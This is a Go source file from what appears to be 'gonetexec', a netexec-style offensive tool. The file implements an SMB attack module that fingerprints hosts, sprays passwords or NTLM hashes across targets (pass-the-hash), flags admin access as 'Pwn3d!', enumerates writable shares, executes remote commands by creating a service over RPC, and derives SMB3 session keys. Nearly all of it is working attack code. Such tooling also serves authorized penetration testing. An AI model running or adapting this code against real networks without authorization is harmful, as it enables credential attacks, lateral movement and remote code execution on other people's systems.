package cli

import (
	"bufio"
	"bytes"
	"context"
	"crypto/hmac"
	"crypto/md5"
	"crypto/rc4"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io/fs"
	"net"
	"os"
	"slices"
	"strings"
	"sync"
	"time"
	"unicode/utf16"

	"github.com/5amu/gonetexec/internal/logger"
	"github.com/5amu/gonetexec/internal/runner"
	"github.com/5amu/gonetexec/pkg/encoder"
	"github.com/5amu/gonetexec/pkg/smb"
	"github.com/fatih/color"
	"github.com/mandiant/gopacket/pkg/session"
	"github.com/mandiant/gopacket/pkg/transport"
	"github.com/spf13/cobra"
	"golang.org/x/crypto/md4" //nolint:staticcheck
)

const DefaultPort = 445

const HelpMsg = `
shares - list available shares
use {sharename} - connect to an specific share
cd {path} - changes the current directory to {path}
ls {opt path} - lists all the files in the current directory or the specified path
rm {file} - removes the selected file
mkdir {dirname} - creates the directory under the current path
rmdir {dirname} - removes the directory under the current path
put {filename} - uploads the filename into the current path
get {filename} - downloads the filename from the current path
mget {mask} - downloads all files from the current directory matching the provided mask
cat {filename} - reads the filename from the current path
mount {target,path} - creates a mount point from {path} to {target} (admin required)
umount {path} - removes the mount point at {path} without deleting the directory (admin required)
close - closes the current SMB Session
exit - terminates the server process (and this session)
logoff - logs off

`

func NewSMBCmd() *cobra.Command {
	var username, password, ntlm, domain string
	var port int
	var listShares, client bool
	var execCmd string

	cmd := &cobra.Command{
		Use:   "smb [TARGETS...]",
		Short: "Own stuff using SMB",
		Args:  cobra.MinimumNArgs(1),
		Run: func(cmd *cobra.Command, args []string) {
			targets := runner.ExtractTargets(args)
			if len(targets) == 0 {
				return
			}

			fingerprints := gatherSMBFingerprints(targets, port)
			if !slices.Contains(os.Args, "-u") {
				return
			}

			credentials := runner.NewCredentialsDispacher(
				username,
				password,
				ntlm,
				runner.Clusterbomb,
			)
			if len(credentials) == 0 {
				return
			}

			var runners []runner.Runner
			for _, target := range targets {
				fp := fingerprints[target.Host]
				if fp == nil {
					continue
				}
				runners = append(runners, &SMBRunner{
					target:      target,
					port:        port,
					credentials: credentials,
					domain:      domain,
					listShares:  listShares,
					execCmd:     execCmd,
					client:      client,
					fingerprint: fp,
				})
			}

			if err := runner.ParallelRun(context.Background(), runners, nil); err != nil {
				l := logger.New("SMB", targets[0].Host, targets[0].Host, port)
				l.Error(fmt.Sprintln(err))
			}
		},
	}

	cmd.Flags().StringVarP(&username, "username", "u", "", "Provide username (or FILE)")
	cmd.Flags().StringVarP(&password, "password", "p", "", "Provide password (or FILE)")
	cmd.Flags().StringVarP(&ntlm, "hashes", "H", "", "authenticate with NTLM hash")
	cmd.Flags().StringVarP(&domain, "domain", "d", "", "provide domain")
	cmd.Flags().IntVar(&port, "port", DefaultPort, "Provide SMB port")
	cmd.Flags().BoolVar(&listShares, "shares", false, "list open shares")
	cmd.Flags().StringVarP(&execCmd, "exec", "x", "", "execute a command by creating a service via RPC")
	cmd.Flags().BoolVar(&client, "client", false, "Open a client to the remote machine")

	return cmd
}

type SMBRunner struct {
	target      session.Target
	port        int
	credentials []session.Credentials
	domain      string
	listShares  bool
	execCmd     string
	client      bool
	fingerprint *smb.SMBFingerprint
	cancelCtx   context.CancelFunc
}

func (r *SMBRunner) Start(ctx context.Context) error {
	childCtx, cancel := context.WithCancel(ctx)
	r.cancelCtx = cancel
	defer r.Stop()

	if r.listShares {
		return r.enumShares(childCtx)
	}
	if r.execCmd != "" {
		return r.exec(childCtx)
	}
	if r.client {
		return r.smbclient(childCtx)
	}
	_, _, err := r.authenticate(childCtx, false)
	return err
}

func (r *SMBRunner) Stop() {
	if r.cancelCtx != nil {
		r.cancelCtx()
	}
}

func (r *SMBRunner) authenticate(ctx context.Context, stopAtFirstMatch bool) (*smb.Session, session.Credentials, error) {
	l := logger.New("SMB", r.target.Host, r.target.Host, r.port)

	domain := r.domain
	if domain == "" {
		domain = r.fingerprint.DNSDomainName
	}

	valid := false
	for _, creds := range r.credentials {
		conn, err := transport.DialTimeout("TCP", fmt.Sprintf("%s:%d", r.target.Host, r.port), 2)
		if err != nil {
			return nil, session.Credentials{}, err
		}

		initiator := smb.NTLMInitiator{
			User:      creds.Username,
			Domain:    domain,
			TargetSPN: "cifs/" + r.fingerprint.NetBIOSComputerName,
		}
		if creds.Hash != "" {
			initiator.Hash = []byte(creds.Hash)
		} else {
			initiator.Password = creds.Password
		}

		childCtx, cancel := context.WithTimeout(ctx, 4*time.Second)
		s, err := (&smb.Dialer{Initiator: &initiator}).DialContext(childCtx, conn)
		cancel()
		if err != nil {
			_ = conn.Close()
			continue
		}

		if stopAtFirstMatch {
			if sid := s.GetSessionID(); sid != nil {
				l.Info("SMB2 Session ID : " + color.HiMagentaString("%x", sid))
			}
			pstr := s.GetNtProofStr()
			skey := s.GetSessionKey()
			if len(pstr)+len(skey) > 16 {
				hash := creds.Hash
				if hash == "" {
					hash = hex.EncodeToString(ntlmhash(creds.Password))
				}
				secretKey := CalculateSMB3EncryptionKey(creds.Username, domain, hash, skey, pstr)
				if len(secretKey) != 0 {
					l.Info("SMB3 Session Key: " + color.HiMagentaString("%x", secretKey))
				}
			}
			return s, creds, nil
		}

		if IsAdminShareWritable(s) {
			l.Log(context.Background(), logger.LevelSuccess, fmt.Sprintf("%s\\%s%s", creds.Domain, creds.Username, color.YellowString(" (Pwn3d!)")))
		} else {
			l.Log(context.Background(), logger.LevelSuccess, fmt.Sprintf("%s\\%s", creds.Domain, creds.Username))
		}
		valid = true
		_ = s.Logoff()
	}

	if valid {
		return nil, session.Credentials{}, nil
	}
	return nil, session.Credentials{}, fmt.Errorf("no valid authentication")
}

func (r *SMBRunner) enumShares(ctx context.Context) error {
	l := logger.New("SMB", r.target.Host, r.target.Host, r.port)

	s, _, err := r.authenticate(ctx, true)
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer func() {
		_ = s.Logoff()
	}()

	sh, err := s.ListSharenames()
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}

	var res [][]string
	for _, sname := range sh {
		var toAppend []string
		readable := false
		writable := false

		if strings.EqualFold(sname, "IPC$") {
			readable = true
			writable = false
		} else {
			fs, err := s.Mount(sname)
			if err == nil {
				readable = true
				err = fs.WriteFile("goadtest.txt", []byte("test"), 0444)
				writable = !os.IsPermission(err)
				if writable {
					_ = fs.Remove("goadtest.txt")
				}
				_ = fs.Umount()
			}
		}

		toAppend = []string{sname}
		if readable {
			w := "READ"
			if writable {
				w += ",WRITE"
			}
			toAppend = append(toAppend, w)
		}
		res = append(res, toAppend)
	}

	l.Log(context.Background(), logger.LevelSuccess, "Listing shares: ")
	for _, shareInfo := range res {
		l.Info(strings.Join(shareInfo, " "))
	}
	return nil
}

func (r *SMBRunner) exec(ctx context.Context) error {
	l := logger.New("SMB", r.target.Host, r.target.Host, r.port)

	s, _, err := r.authenticate(ctx, true)
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer func() {
		_ = s.Logoff()
	}()

	if out, err := s.SmbExec(r.execCmd, "C$"); err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	} else {
		l.Info(out)
	}
	return nil
}

func (r *SMBRunner) smbclient(ctx context.Context) error {
	l := logger.New("SMB", r.target.Host, r.target.Host, r.port)

	s, creds, err := r.authenticate(ctx, true)
	if err != nil {
		l.Error(fmt.Sprintln(err))
		return err
	}
	defer func() {
		_ = s.Logoff()
	}()

	stop := false
	var currentShare *smb.Share
	baseLoc := fmt.Sprintf("\\\\%s\\", r.target.Host)
	cwd := "."
	share := ""
	cmdBufio := bufio.NewReader(os.Stdin)
	for !stop {
		fmt.Printf("(%s) %s >> ", creds.Username, baseLoc+share+cwd)
		cmd, err := cmdBufio.ReadString('\n')
		if err != nil {
			l.Error(fmt.Sprintln(err))
			return err
		}

		cmd = strings.ReplaceAll(strings.ReplaceAll(cmd, "\n", ""), "\r", "")
		switch cmd {
		case "exit", "logoff", "close":
			stop = true
		case "help":
			fmt.Print(HelpMsg)
			continue
		case "shares":
			sharenames, err := s.ListSharenames()
			if err != nil {
				l.Error(fmt.Sprintln(err))
			} else {
				for _, s := range sharenames {
					l.Info(s)
				}
			}
			continue
		case "ls":
			cmd = "ls " + cwd
		case "cd":
			cwd = "."
			continue
		}

		splitted := strings.Split(cmd, " ")
		if len(splitted) != 2 {
			l.Info(fmt.Sprintf("Unknown command: '%s'", cmd))
			continue
		}

		switch splitted[0] {
		case "use":
			if currentShare != nil {
				l.Info("Unmounting current share")
				_ = currentShare.Umount()
				share = ""
			}
			currentShare, err = s.Mount(splitted[1])
			if err != nil {
				l.Error(fmt.Sprintln(err))
			} else {
				share = splitted[1] + "\\"
			}
		case "ls":
			if currentShare == nil {
				l.Info("No share is mounted")
				continue
			}
			_ = fs.WalkDir(currentShare.DirFS(cwd), splitted[1], func(path string, d fs.DirEntry, err error) error {
				if strings.Count(path, "/") != 0 {
					if d.IsDir() {
						return fs.SkipDir
					}
					return nil
				}
				l.Info(path)
				return nil
			})
		case "cd":
			if currentShare == nil {
				l.Info("No share is mounted")
				continue
			}
			cwd = splitted[1]
		}
	}
	l.Info("session closed")
	return nil
}

func IsAdminShareWritable(s *smb.Session) bool {
	fs, err := s.Mount("ADMIN$")
	if err != nil {
		return false
	}
	defer func() {
		_ = fs.Umount()
	}()

	err = fs.WriteFile("goadtest.txt", []byte("test"), 0444)
	if !os.IsPermission(err) {
		_ = fs.Remove("goadtest.txt")
	}
	return !os.IsPermission(err)
}

func gatherSMBFingerprints(targets []session.Target, port int) map[string]*smb.SMBFingerprint {
	ret := make(map[string]*smb.SMBFingerprint)
	var wg sync.WaitGroup
	var mapMutex sync.Mutex
	guard := make(chan struct{}, 128)

	for _, t := range targets {
		wg.Add(1)
		guard <- struct{}{}
		go func(target session.Target) {
			defer wg.Done()
			defer func() { <-guard }()

			fingerprint := getSMBFingerprint(target.Host, port)
			if fingerprint == nil {
				return
			}
			l := logger.New("SMB", target.Host, target.Host, port)
			mapMutex.Lock()
			ret[target.Host] = fingerprint
			mapMutex.Unlock()
			l.Info(FormatFingerprintData(fingerprint))
		}(t)
	}
	wg.Wait()
	return ret
}

func getSMBFingerprint(host string, port int) *smb.SMBFingerprint {
	fchan := make(chan *smb.SMBFingerprint)
	go func() {
		fingerprint, err := smb.FingerprintWithDialer(host, port, func(_ string, addr string) (net.Conn, error) {
			return transport.DialTimeout("TCP", addr, 2)
		})
		if err != nil {
			fchan <- nil
			return
		}
		fchan <- fingerprint
	}()

	select {
	case v := <-fchan:
		return v
	case <-time.After(2 * time.Second):
		return nil
	}
}

func FormatFingerprintData(f *smb.SMBFingerprint) string {
	var builder strings.Builder
	builder.WriteString(f.DNSComputerName)
	if f.OSVersion != "" {
		builder.WriteString(" " + fmt.Sprintf("(version:%s)", f.OSVersion))
	}
	builder.WriteString(" " + fmt.Sprintf("(name:%s)", f.NetBIOSComputerName))
	builder.WriteString(" " + fmt.Sprintf("(domain:%s)", f.DNSDomainName))

	var colorFmt string
	if !f.SigningRequired {
		colorFmt = color.New(color.FgRed, color.Bold).SprintfFunc()("signing:False")
	} else {
		colorFmt = color.New(color.FgGreen).SprintfFunc()("signing:True")
	}
	builder.WriteString(" (" + colorFmt + ")")
	if !f.V1Support {
		colorFmt = color.New(color.FgCyan).SprintfFunc()("SMBv1:False")
	} else {
		colorFmt = color.New(color.FgYellow).SprintfFunc()("SMBv1:True")
	}
	builder.WriteString(" (" + colorFmt + ")")
	return builder.String()
}

func hmacmd5(k []byte, data []byte) []byte {
	h := hmac.New(md5.New, k)
	_, _ = h.Write(data)
	return h.Sum(nil)
}

func ntlmhash(pass string) []byte {
	uints := utf16.Encode([]rune(pass))
	b := bytes.Buffer{}
	_ = binary.Write(&b, binary.LittleEndian, &uints)
	mdfour := md4.New()
	_, _ = mdfour.Write(b.Bytes())
	return mdfour.Sum(nil)
}

func CalculateSMB3EncryptionKey(user, domain, hash string, sessionKey, ntProofStr []byte) []byte {
	usrdom := encoder.StringToUnicode(strings.ToUpper(user) + strings.ToUpper(domain))
	ntlmhs, _ := hex.DecodeString(hash)

	rNTKey := hmacmd5(ntlmhs, usrdom)
	kExKey := hmacmd5(rNTKey, ntProofStr)

	secretKey := make([]byte, len(sessionKey))
	ciph, _ := rc4.NewCipher(kExKey)
	ciph.XORKeyStream(secretKey, sessionKey)
	return secretKey
}
